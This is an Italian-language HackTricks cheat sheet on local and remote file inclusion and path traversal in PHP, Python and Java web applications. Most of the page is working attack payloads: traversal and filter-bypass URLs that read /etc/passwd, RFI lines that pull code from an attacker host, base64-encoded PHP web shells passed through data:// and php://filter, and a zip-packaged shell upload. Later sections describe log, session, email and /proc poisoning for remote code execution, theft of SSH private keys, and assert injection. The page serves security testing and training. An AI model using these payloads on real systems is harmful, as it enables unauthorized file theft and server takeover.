# File Inclusion/Path traversal

{% hint style="success" %}
Impara e pratica l'Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Unisciti al [**Discord di HackenProof**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug bounty!

**Approfondimenti sull'Hacking**\
Interagisci con contenuti che esplorano l'emozione e le sfide dell'hacking

**Notizie di Hacking in Tempo Reale**\
Rimani aggiornato con il mondo frenetico dell'hacking attraverso notizie e approfondimenti in tempo reale

**Ultimi Annunci**\
Rimani informato sui nuovi bug bounty in arrivo e aggiornamenti cruciali delle piattaforme

**Unisciti a noi su** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e inizia a collaborare con i migliori hacker oggi stesso!

## File Inclusion

**Remote File Inclusion (RFI):** Il file viene caricato da un server remoto (Migliore: Puoi scrivere il codice e il server lo eseguir√†). In php questo √® **disabilitato** per impostazione predefinita (**allow\_url\_include**).\
**Local File Inclusion (LFI):** Il server carica un file locale.

La vulnerabilit√† si verifica quando l'utente pu√≤ controllare in qualche modo il file che verr√† caricato dal server.

Funzioni **PHP vulnerabili**: require, require\_once, include, include\_once

Uno strumento interessante per sfruttare questa vulnerabilit√†: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Mescolando diverse liste LFI \*nix e aggiungendo pi√π percorsi, ho creato questa:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Prova anche a cambiare `/` con `\`\
Prova anche ad aggiungere `../../../../../`

Una lista che utilizza diverse tecniche per trovare il file /etc/password (per verificare se la vulnerabilit√† esiste) pu√≤ essere trovata [qui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Unione di diverse liste di parole:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Prova anche a cambiare `/` con `\`\
Prova anche a rimuovere `C:/` e aggiungere `../../../../../`

Una lista che utilizza diverse tecniche per trovare il file /boot.ini (per verificare se la vulnerabilit√† esiste) pu√≤ essere trovata [qui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Controlla la lista LFI di linux.

## LFI di base e bypass

Tutti gli esempi sono per Local File Inclusion ma potrebbero essere applicati anche a Remote File Inclusion (pagina=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### sequenze di traversamento rimosse non ricorsivamente
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Evitare di aggiungere pi√π caratteri alla fine della stringa fornita (bypass di: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Questo √® **risolto da PHP 5.4**

### **Codifica**

Puoi utilizzare codifiche non standard come la doppia codifica URL (e altre):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Dalla cartella esistente

Forse il back-end sta controllando il percorso della cartella:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Esplorare le Directory del File System su un Server

Il file system di un server pu√≤ essere esplorato ricorsivamente per identificare directory, non solo file, impiegando determinate tecniche. Questo processo implica la determinazione della profondit√† della directory e la verifica dell'esistenza di specifiche cartelle. Di seguito √® riportato un metodo dettagliato per raggiungere questo obiettivo:

1. **Determinare la Profondit√† della Directory:** Accertati della profondit√† della tua directory attuale recuperando con successo il file `/etc/passwd` (applicabile se il server √® basato su Linux). Un esempio di URL potrebbe essere strutturato come segue, indicando una profondit√† di tre:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Indagare per Cartelle:** Aggiungi il nome della cartella sospetta (ad esempio, `private`) all'URL, quindi naviga di nuovo a `/etc/passwd`. Il livello di directory aggiuntivo richiede di incrementare la profondit√† di uno:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretare i Risultati:** La risposta del server indica se la cartella esiste:
* **Errore / Nessun Output:** La cartella `private` probabilmente non esiste nella posizione specificata.
* **Contenuti di `/etc/passwd`:** La presenza della cartella `private` √® confermata.
4. **Esplorazione Ricorsiva:** Le cartelle scoperte possono essere ulteriormente esplorate per sottodirectory o file utilizzando la stessa tecnica o metodi tradizionali di Local File Inclusion (LFI).

Per esplorare directory in diverse posizioni nel file system, regola il payload di conseguenza. Ad esempio, per controllare se `/var/www/` contiene una directory `private` (supponendo che la directory corrente sia a una profondit√† di 3), usa:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Tecnica di Troncamento del Percorso**

Il troncamento del percorso √® un metodo impiegato per manipolare i percorsi dei file nelle applicazioni web. Viene spesso utilizzato per accedere a file riservati bypassando alcune misure di sicurezza che aggiungono caratteri aggiuntivi alla fine dei percorsi dei file. L'obiettivo √® creare un percorso di file che, una volta alterato dalla misura di sicurezza, punti ancora al file desiderato.

In PHP, varie rappresentazioni di un percorso di file possono essere considerate equivalenti a causa della natura del file system. Ad esempio:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` e `/etc/passwd/` sono tutti trattati come lo stesso percorso.
* Quando gli ultimi 6 caratteri sono `passwd`, aggiungere un `/` (rendendolo `passwd/`) non cambia il file mirato.
* Allo stesso modo, se `.php` viene aggiunto a un percorso di file (come `shellcode.php`), aggiungere `/.` alla fine non alterer√† il file a cui si accede.

Gli esempi forniti dimostrano come utilizzare il troncamento del percorso per accedere a `/etc/passwd`, un obiettivo comune a causa del suo contenuto sensibile (informazioni sugli account utente):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In questi scenari, il numero di traversate necessarie potrebbe essere intorno a 2027, ma questo numero pu√≤ variare in base alla configurazione del server.

* **Utilizzo di Segmenti di Punto e Caratteri Aggiuntivi**: Le sequenze di traversata (`../`) combinate con segmenti di punto e caratteri extra possono essere utilizzate per navigare nel file system, ignorando efficacemente le stringhe aggiunte dal server.
* **Determinare il Numero Richiesto di Traversate**: Attraverso tentativi ed errori, si pu√≤ trovare il numero preciso di sequenze `../` necessarie per navigare fino alla directory radice e poi a `/etc/passwd`, assicurandosi che eventuali stringhe aggiunte (come `.php`) siano neutralizzate ma il percorso desiderato (`/etc/passwd`) rimanga intatto.
* **Iniziare con una Directory Fittizia**: √à una pratica comune iniziare il percorso con una directory inesistente (come `a/`). Questa tecnica viene utilizzata come misura precauzionale o per soddisfare i requisiti della logica di parsing del percorso del server.

Quando si impiegano tecniche di troncamento del percorso, √® fondamentale comprendere il comportamento di parsing del percorso del server e la struttura del file system. Ogni scenario potrebbe richiedere un approccio diverso, e spesso √® necessario testare per trovare il metodo pi√π efficace.

**Questa vulnerabilit√† √® stata corretta in PHP 5.3.**

### **Trucchi per bypassare i filtri**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

In php questo √® disabilitato per impostazione predefinita perch√© **`allow_url_include`** √® **Off.** Deve essere **On** affinch√© funzioni, e in quel caso potresti includere un file PHP dal tuo server e ottenere RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Se per qualche motivo **`allow_url_include`** √® **On**, ma PHP sta **filtrando** l'accesso a pagine web esterne, [secondo questo post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), potresti usare ad esempio il protocollo dati con base64 per decodificare un codice PHP b64 e ottenere RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Nel codice precedente, il finale `+.txt` √® stato aggiunto perch√© l'attaccante aveva bisogno di una stringa che finisse con `.txt`, quindi la stringa termina con essa e dopo la decodifica b64 quella parte restituir√† solo spazzatura e il vero codice PHP sar√† incluso (e quindi, eseguito).
{% endhint %}

Un altro esempio **che non utilizza il protocollo `php://`** sarebbe:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Elemento radice Python

In python in un codice come questo:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Se l'utente passa un **percorso assoluto** a **`file_name`**, il **percorso precedente viene semplicemente rimosso**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
√à il comportamento previsto secondo [la documentazione](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Se un componente √® un percorso assoluto, tutti i componenti precedenti vengono scartati e l'unione continua dal componente del percorso assoluto.

## Elenco delle directory Java

Sembra che se hai un Path Traversal in Java e **richiedi una directory** invece di un file, **viene restituito un elenco della directory**. Questo non accadr√† in altre lingue (per quanto ne so).

## Top 25 parametri

Ecco un elenco dei 25 parametri principali che potrebbero essere vulnerabili a vulnerabilit√† di inclusione di file locali (LFI) (da [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI utilizzando wrapper e protocolli PHP

### php://filter

I filtri PHP consentono di eseguire **operazioni di modifica di base sui dati** prima che vengano letti o scritti. Ci sono 5 categorie di filtri:

* [Filtri Stringa](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Rimuove i tag dai dati (tutto ci√≤ che si trova tra i caratteri "<" e ">")
* Nota che questo filtro √® scomparso dalle versioni moderne di PHP
* [Filtri di Conversione](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Trasforma in una codifica diversa (`convert.iconv.<input_enc>.<output_enc>`). Per ottenere la **lista di tutte le codifiche** supportate esegui nel terminale: `iconv -l`

{% hint style="warning" %}
Abusando del filtro di conversione `convert.iconv.*` puoi **generare testo arbitrario**, il che potrebbe essere utile per scrivere testo arbitrario o per rendere una funzione come include processo testo arbitrario. Per ulteriori informazioni controlla [**LFI2RCE tramite filtri php**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtri di Compressione](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Comprimi il contenuto (utile se si esfiltra una grande quantit√† di informazioni)
* `zlib.inflate`: Decomprime i dati
* [Filtri di Crittografia](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Deprecato
* `mdecrypt.*` : Deprecato
* Altri Filtri
* Eseguendo in php `var_dump(stream_get_filters());` puoi trovare un paio di **filtri inaspettati**:
* `consumed`
* `dechunk`: inverte la codifica HTTP chunked
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
La parte "php://filter" non fa distinzione tra maiuscole e minuscole
{% endhint %}

### Utilizzare i filtri php come oracle per leggere file arbitrari

[**In questo post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) viene proposta una tecnica per leggere un file locale senza avere l'output restituito dal server. Questa tecnica si basa su una **esfiltrazione booleana del file (carattere per carattere) utilizzando i filtri php** come oracle. Questo perch√© i filtri php possono essere utilizzati per rendere un testo abbastanza grande da far generare un'eccezione a php.

Nel post originale puoi trovare una spiegazione dettagliata della tecnica, ma ecco un rapido riassunto:

* Utilizzare il codec **`UCS-4LE`** per lasciare il carattere iniziale del testo all'inizio e far aumentare esponenzialmente la dimensione della stringa.
* Questo sar√† utilizzato per generare un **testo cos√¨ grande quando la lettera iniziale √® indovinata correttamente** che php attiver√† un **errore**.
* Il filtro **dechunk** **rimuover√† tutto se il primo carattere non √® un esadecimale**, quindi possiamo sapere se il primo carattere √® esadecimale.
* Questo, combinato con il precedente (e altri filtri a seconda della lettera indovinata), ci permetter√† di indovinare una lettera all'inizio del testo vedendo quando facciamo abbastanza trasformazioni per far s√¨ che non sia un carattere esadecimale. Perch√© se √® esadecimale, dechunk non lo eliminer√† e la bomba iniziale far√† generare un errore a php.
* Il codec **convert.iconv.UNICODE.CP930** trasforma ogni lettera nella successiva (quindi dopo questo codec: a -> b). Questo ci permette di scoprire se la prima lettera √® una `a` per esempio, perch√© se applichiamo 6 di questo codec a->b->c->d->e->f->g la lettera non √® pi√π un carattere esadecimale, quindi dechunk non l'ha eliminata e l'errore php viene attivato perch√© si moltiplica con la bomba iniziale.
* Utilizzando altre trasformazioni come **rot13** all'inizio √® possibile esfiltrare altri caratteri come n, o, p, q, r (e altri codec possono essere utilizzati per spostare altre lettere nell'intervallo esadecimale).
* Quando il carattere iniziale √® un numero √® necessario codificarlo in base64 e esfiltrare le prime 2 lettere per esfiltrare il numero.
* Il problema finale √® vedere **come esfiltrare pi√π della lettera iniziale**. Utilizzando filtri di memoria ordinata come **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** √® possibile cambiare l'ordine dei caratteri e ottenere in prima posizione altre lettere del testo.
* E per poter ottenere **ulteriori dati** l'idea √® di **generare 2 byte di dati spazzatura all'inizio** con **convert.iconv.UTF16.UTF16**, applicare **UCS-4LE** per farlo **pivotare con i successivi 2 byte**, e **eliminare i dati fino ai dati spazzatura** (questo rimuover√† i primi 2 byte del testo iniziale). Continuare a farlo fino a raggiungere il bit desiderato da esfiltrare.

Nel post √® stata anche esfiltrata un'utility per eseguire questo automaticamente: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Questo wrapper consente di accedere ai descrittori di file che il processo ha aperti. Potenzialmente utile per esfiltrare il contenuto dei file aperti:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Puoi anche usare **php://stdin, php://stdout e php://stderr** per accedere ai **file descriptor 0, 1 e 2** rispettivamente (non sono sicuro di come questo possa essere utile in un attacco)

### zip:// e rar://

Carica un file Zip o Rar con un PHPShell all'interno e accedilo.\
Per poter abusare del protocollo rar, **deve essere specificamente attivato**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Nota che questo protocollo √® limitato dalle configurazioni php **`allow_url_open`** e **`allow_url_include`**

### expect://

Expect deve essere attivato. Puoi eseguire codice usando questo:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Specifica il tuo payload nei parametri POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Un file `.phar` pu√≤ essere utilizzato per eseguire codice PHP quando un'applicazione web sfrutta funzioni come `include` per il caricamento dei file. Il frammento di codice PHP fornito di seguito dimostra la creazione di un file `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Per compilare il file `.phar`, il seguente comando dovrebbe essere eseguito:
```bash
php --define phar.readonly=0 create_path.php
```
Al momento dell'esecuzione, verr√† creato un file chiamato `test.phar`, che potrebbe essere sfruttato per sfruttare le vulnerabilit√† di Local File Inclusion (LFI).

Nei casi in cui l'LFI esegue solo la lettura dei file senza eseguire il codice PHP al loro interno, attraverso funzioni come `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, o `filesize()`, potrebbe essere tentato lo sfruttamento di una vulnerabilit√† di deserializzazione. Questa vulnerabilit√† √® associata alla lettura di file utilizzando il protocollo `phar`.

Per una comprensione dettagliata dello sfruttamento delle vulnerabilit√† di deserializzazione nel contesto dei file `.phar`, fare riferimento al documento collegato qui sotto:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

√à stato possibile abusare di **qualsiasi file arbitrario letto da PHP che supporta i filtri php** per ottenere un RCE. La descrizione dettagliata pu√≤ essere [**trovata in questo post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Riassunto molto rapido: un **overflow di 3 byte** nell'heap di PHP √® stato abusato per **modificare la catena di chunk liberi** di una dimensione specifica al fine di poter **scrivere qualsiasi cosa in qualsiasi indirizzo**, quindi √® stato aggiunto un hook per chiamare **`system`**.\
√à stato possibile allocare chunk di dimensioni specifiche abusando di pi√π filtri php.

### Altri protocolli

Controlla altri possibili [**protocolli da includere qui**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory e php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî Scrivere in memoria o in un file temporaneo (non sono sicuro di come questo possa essere utile in un attacco di inclusione di file)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî Accesso al filesystem locale
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî Accesso a URL HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî Accesso a URL FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî Stream di compressione
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî Trova nomi di percorso che corrispondono a un modello (non restituisce nulla di stampabile, quindi non √® davvero utile qui)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî Stream audio (non utile per leggere file arbitrari)

## LFI tramite 'assert' di PHP

I rischi di Local File Inclusion (LFI) in PHP sono notevolmente elevati quando si tratta della funzione 'assert', che pu√≤ eseguire codice all'interno delle stringhe. Questo √® particolarmente problematico se l'input contenente caratteri di traversamento delle directory come ".." viene controllato ma non correttamente sanificato.

Ad esempio, il codice PHP potrebbe essere progettato per prevenire il traversamento delle directory in questo modo:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Mentre questo mira a fermare la traversata, crea involontariamente un vettore per l'iniezione di codice. Per sfruttare questo per leggere i contenuti dei file, un attaccante potrebbe utilizzare:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Allo stesso modo, per eseguire comandi di sistema arbitrari, si potrebbe usare:
```plaintext
' and die(system("id")) or '
```
√à importante **URL-encoded questi payload**.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Unisciti al server [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug bounty!

**Approfondimenti sul hacking**\
Interagisci con contenuti che approfondiscono l'emozione e le sfide dell'hacking

**Notizie di hacking in tempo reale**\
Rimani aggiornato con il mondo frenetico dell'hacking attraverso notizie e approfondimenti in tempo reale

**Ultimi annunci**\
Rimani informato sui nuovi bug bounty in arrivo e sugli aggiornamenti cruciali delle piattaforme

**Unisciti a noi su** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e inizia a collaborare con i migliori hacker oggi stesso!

## PHP Blind Path Traversal

{% hint style="warning" %}
Questa tecnica √® rilevante nei casi in cui **controlli** il **percorso del file** di una **funzione PHP** che **acceder√† a un file** ma non vedrai il contenuto del file (come una semplice chiamata a **`file()`**) ma il contenuto non viene mostrato.
{% endhint %}

In [**questo incredibile post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) viene spiegato come un blind path traversal possa essere abusato tramite un filtro PHP per **esfiltrare il contenuto di un file tramite un errore oracle**.

In sintesi, la tecnica utilizza la **codifica "UCS-4LE"** per rendere il contenuto di un file cos√¨ **grande** che la **funzione PHP che apre** il file generer√† un **errore**.

Poi, per esfiltrare il primo carattere, il filtro **`dechunk`** viene utilizzato insieme ad altri come **base64** o **rot13** e infine i filtri **convert.iconv.UCS-4.UCS-4LE** e **convert.iconv.UTF16.UTF-16BE** vengono utilizzati per **posizionare altri caratteri all'inizio e esfiltrarli**.

**Funzioni che potrebbero essere vulnerabili**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (solo target in sola lettura con questo)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Per i dettagli tecnici controlla il post menzionato!

## LFI2RCE

### Remote File Inclusion

Spiegato in precedenza, [**segui questo link**](./#remote-file-inclusion).

### Via file di log Apache/Nginx

Se il server Apache o Nginx √® **vulnerabile a LFI** all'interno della funzione include, potresti provare ad accedere a **`/var/log/apache2/access.log` o `/var/log/nginx/access.log`**, impostando all'interno del **user agent** o all'interno di un **parametro GET** una shell PHP come **`<?php system($_GET['c']); ?>`** e includere quel file

{% hint style="warning" %}
Nota che **se usi virgolette doppie** per la shell invece di **virgolette semplici**, le virgolette doppie verranno modificate per la stringa "_**quote;**_", **PHP generer√† un errore** l√¨ e **nient'altro verr√† eseguito**.

Inoltre, assicurati di **scrivere correttamente il payload** o PHP generer√† un errore ogni volta che cerca di caricare il file di log e non avrai una seconda opportunit√†.
{% endhint %}

Questo potrebbe essere fatto anche in altri log, ma **fai attenzione**, il codice all'interno dei log potrebbe essere URL encoded e questo potrebbe distruggere la Shell. L'intestazione **autorizzazione "basic"** contiene "user:password" in Base64 ed √® decodificata all'interno dei log. La PHPShell potrebbe essere inserita all'interno di questa intestazione.\
Altri possibili percorsi di log:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**Invia una mail** a un account interno (user@localhost) contenente il tuo payload PHP come `<?php echo system($_REQUEST["cmd"]); ?>` e prova a includere nella mail dell'utente con un percorso come **`/var/mail/<USERNAME>`** o **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Carica molte shell (ad esempio: 100)
2. Includi [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), con $PID = PID del processo (pu√≤ essere forzato a bruteforce) e $FD il file descriptor (pu√≤ essere forzato a bruteforce anche)

### Via /proc/self/environ

Come un file di log, invia il payload nell'User-Agent, verr√† riflesso all'interno del file /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Se puoi caricare un file, basta iniettare il payload della shell in esso (ad es: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Per mantenere il file leggibile, √® meglio iniettare nei metadati delle immagini/doc/pdf

### Via caricamento di file Zip

Carica un file ZIP contenente una shell PHP compressa e accedi:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP sessions

Controlla se il sito web utilizza PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP, queste sessioni sono memorizzate nei file _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Imposta il cookie su `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Usa l'LFI per includere il file di sessione PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Se ssh √® attivo, controlla quale utente viene utilizzato (/proc/self/status & /etc/passwd) e prova ad accedere a **\<HOME>/.ssh/id\_rsa**

### **Via** **vsftpd** _**logs**_

I log per il server FTP vsftpd si trovano in _**/var/log/vsftpd.log**_. Nello scenario in cui esista una vulnerabilit√† di Local File Inclusion (LFI) e sia possibile accedere a un server vsftpd esposto, possono essere considerati i seguenti passaggi:

1. Inietta un payload PHP nel campo nome utente durante il processo di accesso.
2. Dopo l'iniezione, utilizza l'LFI per recuperare i log del server da _**/var/log/vsftpd.log**_.

### Via php base64 filter (using base64)

Come mostrato in [questo](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) articolo, il filtro PHP base64 ignora semplicemente i Non-base64. Puoi usarlo per bypassare il controllo dell'estensione del file: se fornisci base64 che termina con ".php", ignorer√† semplicemente il "." e aggiunger√† "php" al base64. Ecco un esempio di payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
